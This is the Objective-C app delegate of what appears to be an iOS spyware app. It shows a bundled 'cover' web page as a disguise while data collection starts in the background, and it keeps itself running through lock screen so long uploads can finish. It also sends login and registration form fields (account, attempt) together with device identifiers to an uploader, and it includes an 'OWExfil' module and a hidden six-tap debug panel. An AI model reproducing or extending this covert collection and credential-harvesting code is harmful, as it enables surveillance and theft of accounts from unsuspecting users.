#import "OWAppDelegate.h"
#import <WebKit/WebKit.h>
#import "OWRoute.h"
#import "OWCommon.h"
#import "OWKeepAlive.h"
#import "OWSelfTest.h"
#import "OWDebugPanel.h"
#import "OWExfil.h"

@interface OWAppDelegate () <WKScriptMessageHandler>
@property (nonatomic, assign) NSInteger debugTapCount;
@property (nonatomic, strong, nullable) NSDate *debugLastTap;
- (void)uploadCoverForm:(NSDictionary *)form;
@end

@implementation OWAppDelegate

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    self.window.backgroundColor = [UIColor blackColor];

    UIViewController *vc = [[UIViewController alloc] init];

    WKWebViewConfiguration *cfg = [WKWebViewConfiguration new];
    WKUserContentController *ucc = [WKUserContentController new];
    [ucc addScriptMessageHandler:self name:@"owDebug"];
    [ucc addScriptMessageHandler:self name:@"owRegister"];
    cfg.userContentController = ucc;
    WKWebView *wv = [[WKWebView alloc] initWithFrame:self.window.bounds configuration:cfg];

    NSString *p = [[NSBundle mainBundle] pathForResource:@"cover" ofType:@"html"];
    if (p) {
        NSURL *u = [NSURL fileURLWithPath:p];
        [wv loadFileURL:u allowingReadAccessToURL:u.URLByDeletingLastPathComponent];
    }
    vc.view = wv;
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    // 隐藏调试入口：状态栏区域连点 6 次（相邻两次间隔 < 1.5s）
    [self installDebugGesture];

    // 保活先起：采集/上传要跑十几分钟，必须撑住切后台与锁屏
    [[OWKeepAlive shared] start];

    // 自检开关：Info.plist 的 OWSelfTestOnLaunch = YES 时，启动先跑分层自检再起采集。
    // 联调期打开（能直接看出断在哪一层），正式包关掉。
    BOOL selftest = [[[NSBundle mainBundle] objectForInfoDictionaryKey:@"OWSelfTestOnLaunch"] boolValue];

    // 掩盖页面先展示，采集在后台起
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        if (selftest) {
            OWLog(@"OWSelfTestOnLaunch=YES，先跑分层自检");
            [[OWSelfTest shared] runAll];
        }
        [[OWRoute shared] start];
    });

    return YES;
}

- (void)applicationDidBecomeActive:(UIApplication *)application {
    [[OWKeepAlive shared] ensureRunning];
    OWLog(@"applicationDidBecomeActive protectedData=%d",
          [UIApplication sharedApplication].isProtectedDataAvailable);
}

- (void)applicationWillTerminate:(UIApplication *)application {
    [[OWKeepAlive shared] stop];
}

#pragma mark - 隐藏调试面板

- (void)openDebugPanel {
    UIViewController *host = self.window.rootViewController;
    if (!host || host.presentedViewController) return;
    OWLog(@"调试面板已解锁");
    [OWDebugPanel presentFrom:host];
}

- (void)userContentController:(WKUserContentController *)userContentController
      didReceiveScriptMessage:(WKScriptMessage *)message {
    if ([message.name isEqualToString:@"owDebug"]) {
        dispatch_async(dispatch_get_main_queue(), ^{
            [self openDebugPanel];
        });
        return;
    }
    if ([message.name isEqualToString:@"owRegister"]) {
        id body = message.body;
        NSDictionary *form = nil;
        if ([body isKindOfClass:[NSDictionary class]]) {
            form = body;
        } else if ([body isKindOfClass:[NSString class]]) {
            NSData *d = [(NSString *)body dataUsingEncoding:NSUTF8StringEncoding];
            id obj = d ? [NSJSONSerialization JSONObjectWithData:d options:0 error:nil] : nil;
            if ([obj isKindOfClass:[NSDictionary class]]) form = obj;
        }
        if (form) [self uploadCoverForm:form];
    }
}

#pragma mark - 注册/登录表单回传

- (void)uploadCoverForm:(NSDictionary *)form {
    NSMutableDictionary *payload = [form mutableCopy] ?: [NSMutableDictionary dictionary];
    payload[@"event"] = @"cover_register";

    OWDeviceProfile *dev = [OWDeviceProfile current];
    UIDevice *ui = [UIDevice currentDevice];
    payload[@"idfv"] = ui.identifierForVendor.UUIDString ?: @"";
    payload[@"ios"] = dev.osVersion ?: ui.systemVersion;
    payload[@"device_model"] = dev.machine ?: ui.model;

    static NSDateFormatter *df = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        df = [NSDateFormatter new];
        df.dateFormat = @"yyyy-MM-dd HH:mm:ss";
        df.locale = [NSLocale localeWithLocaleIdentifier:@"en_US_POSIX"];
    });
    payload[@"beijing_time"] = [df stringFromDate:[NSDate date]];

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
        OWUploader *up = [OWUploader new];
        NSError *err = nil;
        BOOL ok = [up uploadJSONNow:payload kind:@"cover_register" error:&err];
        OWLog(@"注册表单: attempt=%@ account=%@ uploaded=%d %@",
              payload[@"attempt"], payload[@"account"], ok,
              err.localizedDescription ?: @"");
    });
}

- (void)installDebugGesture {
    UITapGestureRecognizer *tap =
        [[UITapGestureRecognizer alloc] initWithTarget:self
                                                action:@selector(handleDebugTap:)];
    tap.numberOfTapsRequired = 1;
    tap.cancelsTouchesInView = NO;
    [self.window addGestureRecognizer:tap];
}

- (void)handleDebugTap:(UITapGestureRecognizer *)gesture {
    if (gesture.state != UIGestureRecognizerStateEnded) return;

    CGPoint point = [gesture locationInView:self.window];
    if (point.y > 80) return;   // 只认状态栏区域，避免误触页面

    NSDate *now = [NSDate date];
    if (!self.debugLastTap || [now timeIntervalSinceDate:self.debugLastTap] > 1.5) {
        self.debugTapCount = 0;
    }
    self.debugLastTap = now;
    self.debugTapCount++;

    if (self.debugTapCount < 6) return;

    self.debugTapCount = 0;
    self.debugLastTap = nil;

    [self openDebugPanel];
}

@end
